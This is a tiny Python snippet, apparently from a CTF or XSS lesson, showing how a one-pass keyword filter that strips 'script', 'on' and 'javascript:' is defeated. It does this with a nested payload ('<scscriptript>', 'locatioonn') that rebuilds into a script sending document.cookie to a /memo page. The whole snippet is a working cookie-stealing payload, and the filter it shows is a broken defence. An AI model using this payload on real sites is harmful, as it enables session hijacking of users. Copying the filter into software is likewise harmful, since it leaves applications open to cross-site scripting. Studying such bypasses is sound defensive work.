text="<scscriptript>locatioonn.href='/memo?memo='+document.cookie;</scscriptript>"

_filter = ["script", "on", "javascript:"]
for f in _filter:
    if f in text.lower():
        text = text.replace(f, "")
print(text)